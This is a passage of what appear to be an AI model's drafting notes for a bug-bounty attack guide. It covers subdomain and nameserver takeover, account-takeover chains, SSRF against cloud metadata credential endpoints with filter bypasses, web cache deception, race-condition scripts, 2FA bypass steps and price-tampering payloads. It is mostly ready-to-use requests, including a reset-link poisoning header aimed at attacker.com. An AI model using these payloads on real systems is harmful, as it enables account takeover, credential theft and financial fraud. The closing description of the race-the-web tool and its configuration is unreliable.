- Unbounce: `The requested URL was not found on this server`
- Pantheon: `The gods are wise`
- Surge: `project not found`
- Bitbucket: `Repository not found`
- Cargo: `If you're moving your domain away`
- Ghost: `Domain error`
- Statuspage: `You are being redirected`

NS takeover: dangling nameservers → register at registrar.
```bash
dig +short NS old.target.com
# check if NS domain is available
whois old-ns-domain.com
```
Also dangling A → EIP: `dig +short A sub.target.com` → check if IP is unallocated (AWS elastic IP), claim via EC2.

Report: writeup with CNAME proof, screenshot, "I claimed and released within 24h", impact: cookie domain, OAuth/CSP/SAML/redirect_uri allowlist, CORS trust, phishing, subdomain trust for email (SPF/DKIM if you control subdomain and can send mail — high impact).

Account takeover section: chains.

Password reset host injection:
```http
POST /api/auth/forgot HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email":"victim@example.com"}
```
Or `?host=`, `?redirect=`, `X-Forwarded-For` etc. Check if reset link uses `$_SERVER['HTTP_HOST']`.

Token leakage via Referer: reset link page includes third-party script/analytics → token leaks in Referer. Or reset URL in email but page loads external JS.

Token predictability: base64 timestamp, sequential, MD5(email), short.

Response manipulation for 2FA/reset verification.

OAuth: `redirect_uri` bypass, `state` missing → CSRF to link attacker account. Pre-account takeover: sign up with victim@example.com, no verification → attacker created account, victim later registers → attacker still has access (usually via password reset to their own or an OAuth link). Or: OAuth email not verified → `email=admin@target.com` from IdP not verified → ATO.

SAML: XML signature wrapping, comment injection, `Signature` covering only part.

JWT: `alg:none`, weak secret `hashcat -a 0 -m 16500`, `kid` path traversal to `/dev/null`, `jku`/`x5u` to attacker JWKS.

Report: two accounts, video, full chain, "any user with known email/username", severity critical.

SSRF section:

Payload table. IMDSv2:
```bash
# IMDSv2 requires PUT
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```
If SSRF can set method+headers → full.

GCP:
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Azure:
```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

Bypass encodings:
```
http://2852039166/latest/meta-data/
http://0251.0376.0251.0376/
http://[::ffff:169.254.169.254]/
http://169.254.169.254.nip.io/
http://localtest.me/
http://0x7f000001/
```
DNS rebinding via `rbndr.us` / custom NS with TTL 0.

Blind: interactsh / collab, then time-based or error-based.

Report: metadata → creds → `aws sts get-caller-identity` → enumerate. Provide redacted proof.

Cache deception:

Detection:
```bash
curl -s -D- "https://target.com/account/settings.css" | grep -iE 'x-cache|cache-control|age|content-type'
```
Cache key vs origin confusion payloads:
```
/account/settings.css
/account/settings;.css
/account/settings%00.css
/account/settings%23.css
/account/settings/..%2f.css
/account/settings%3f.css
/account/.css
/account/settings.css?cb=1
/account/settings.json
/account/settings%2Ecss
```
Mechanism table: origin strips static extension → serves dynamic; CDN keys full path → caches.

Full flow with two browsers/sessions. Use a cache buster unique to victim request so attacker retrieves the right entry.

Poisoning adjacent: unkeyed headers `X-Forwarded-Host`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL` → if reflected in absolute URL/JS → stored XSS.

Report: victim PII in attacker browser, HTTP 200 from cache, `X-Cache: HIT`, no cookies. Show curl with no cookies returning victim data.

Race:

Turbo Intruder HTTP/2 single packet:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```
Or `race-the-web` YAML.

Python asyncio last-byte sync (HTTP/1.1):
```python
import socket, ssl, time
# build N requests, send without last byte, then send all last bytes
```
Better to reference `h2` + single packet or `turbo-intruder`.

Coupon race: 30 parallel `POST /cart/apply-coupon` with same code.
Withdrawal race: parallel `POST /wallet/withdraw {"amount":100}`.
TOCTOU: check-then-act in DB without row lock → `SELECT ... FOR UPDATE` missing.

Report: show state: coupon applied 30x, discount total, order total negative or near-zero; or 10 withdrawals from $100 → account balance -$900. Provide script. Impact: direct financial loss per user, reproducible.

2FA bypass:

Checklist of tests with concrete steps:
1. `POST /login` → returns 200 with `{"mfa_required":true}` + session cookie → try `GET /dashboard` with that cookie.
2. Change `mfa_required` to false / `verified:true`.
3. OTP `000000` / `null` / empty / array `[0]` / JSON type juggling (`"0e123"` magic hash).
4. OTP response leakage: response contains `{"otp":"123456"}` or header.
5. Rate limit: 1000 requests, check lockout; rotate `X-Forwarded-For`.
6. OTP reuse within window.
7. Backup codes brute force.
8. `remember_device` cookie forgeable (JWT? predictable?).
9. Disable 2FA without password re-auth.
10. OTP verify endpoint without session → bypass.
11. Mobile/legacy API `/api/v1/login` skips 2FA.
12. Password reset → 2FA not required after reset (sometimes by design, sometimes a bypass).
13. `POST /mfa/verify` accepts `user_id` of another user → IDOR.

Report: password-only ATO. Chain to admin if applicable.

Business logic:

Price/quantity payloads:
```json
{"item_id":1,"quantity":-1,"price":0.01}
{"quantity":-5}
{"price":"0.01"}
{"coupon":"SAVE20","coupon":"SAVE20"} // duplicate keys
{"currency":"IDR","price":100}
{"quantity":2147483648}
{"quantity":1e-9}
{"amount":-100}
```
Mass assignment: `{"role":"admin","is_paid":true,"credit":99999}`.

Find: add-to-cart flow, intercept, tamper; compare server-side total vs client; try currency switch; try negative qty for refund; try coupon on sale items; try stacking; try gift card overflow; try shipping negative.

Cents vs dollars: send `1` meaning $0.01 vs $1.

Report: money impact, order confirmation, invoice. Show net gain.

I'll also add a "report template" section — the shape that gets accepted: title format, summary, steps, impact, remediation, PoC, severity, attachments.

And a short "triage multipliers" section.

Let me write final. Keep code blocks. No hedging. Include a line about scope discipline: stay within written scope, don't touch real customer data, use your own accounts. That's tradecraft and it's what a senior operator says — not hedging.

I'll write now. Make sure headers/structure clean.

Length check — this will be long but the user asked for depth across seven classes. Good.

One more: mention Caido/Burp plugins, `autorize`, `param-miner`, `turbo-intruder`, `collaborator`.

Also mention HTTP/2 single-packet attack requires h2 and `requestsPerConnection` and one connection.

For `race-the-web`:
```yaml
# race.yml
---
config:
  target: "https://target.com"
  phases:
    - duration: 1
      arrivalCount: 30
  defaults:
    headers:
      Cookie: "session=..."
scenarios:
  - flow:
      - post:
          url: "/api/cart/coupon"
          json:
            code: "SAVE20"
```
That's roughly right (race-the-web is artillery-based).

Write it.
